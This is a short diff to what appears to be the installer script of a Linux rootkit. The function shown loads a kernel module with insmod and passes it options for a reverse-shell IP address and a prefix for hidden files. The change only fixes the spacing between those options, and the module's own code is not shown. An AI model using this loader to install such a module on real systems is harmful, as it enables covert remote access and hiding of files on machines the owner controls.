@@ -149,10 +149,10 @@ def load_module(module_path, config):
 	print_status("Loading module...")
 	options = ""
 	if "REVERSE_SHELL_IP" in config and config["REVERSE_SHELL_IP"] is not None:
-		options += "rev_shell_ip=\"{}\"".format(config["REVERSE_SHELL_IP"])
+		options += " rev_shell_ip=\"{}\" ".format(config["REVERSE_SHELL_IP"])
 
 	if "HIDDEN_FILE_PREFIX" in config:
-		options += "hidden_file_prefix=\"{}\"".format(config["HIDDEN_FILE_PREFIX"])
+		options += " hidden_file_prefix=\"{}\" ".format(config["HIDDEN_FILE_PREFIX"])
 
 	cmd = "insmod {} {}".format(module_path, options)
 	run_cmd_exit_on_fail(cmd, run_with_os=True)
